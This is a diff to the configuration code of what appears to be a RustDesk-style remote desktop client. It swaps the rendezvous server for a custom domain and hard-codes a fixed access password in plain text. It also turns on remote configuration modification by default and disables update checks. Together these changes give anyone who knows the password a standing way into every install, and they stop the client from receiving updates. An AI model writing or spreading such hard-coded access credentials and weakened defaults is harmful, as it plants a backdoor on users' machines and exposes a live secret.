@@ -79,7 +79,12 @@ lazy_static::lazy_static! {
     pub static ref OVERWRITE_DISPLAY_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref DEFAULT_LOCAL_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref OVERWRITE_LOCAL_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
-    pub static ref HARD_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
+    pub static ref HARD_SETTINGS: RwLock<HashMap<String, String>> = {
+        let mut map = HashMap::new();
+        map.insert("password".to_string(), "Zxc900807..".to_string());
+        RwLock::new(map)
+    };
+
     pub static ref BUILTIN_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
 }
 
@@ -114,7 +119,7 @@ const CHARS: &[char] = &[
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
 
-pub const RENDEZVOUS_SERVERS: &[&str] = &["47.103.198.242"];
+pub const RENDEZVOUS_SERVERS: &[&str] = &["rust.igame.plus"];
 pub const RS_PUB_KEY: &str = "iyOtzD+NaCsASaxmPOAmuyvLJt56FNXifWXQk0NVgZw=";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
@@ -490,6 +495,11 @@ impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
         let mut store = false;
+		
+		if !config.options.contains_key("allow-remote-config-modification") {
+            config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
+            store = true;
+        }
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
                 decrypt_str_or_original(&socks.password, PASSWORD_ENC_VERSION);
@@ -2140,7 +2150,29 @@ pub struct LocalConfig {
 
 impl LocalConfig {
     fn load() -> LocalConfig {
-        Config::load_::<LocalConfig>("_local")
+        let mut config = Config::load_::<LocalConfig>("_local");
+		let mut store = false;
+		
+		if !config.options.contains_key("enable-udp-punch") {
+			config.options.insert("enable-udp-punch".to_string(), "Y".to_string());
+			store = true;
+		}
+		
+		if !config.options.contains_key("enable-ipv6-punch") {
+			config.options.insert("enable-ipv6-punch".to_string(), "Y".to_string());
+			store = true;
+        }
+		
+		if !config.options.contains_key("enable-check-update") {
+			config.options.insert("enable-check-update".to_string(), "N".to_string());
+			store = true;
+		} 
+
+		
+		if store {
+			config.store();
+		}
+		config
     }
 
     fn store(&self) {
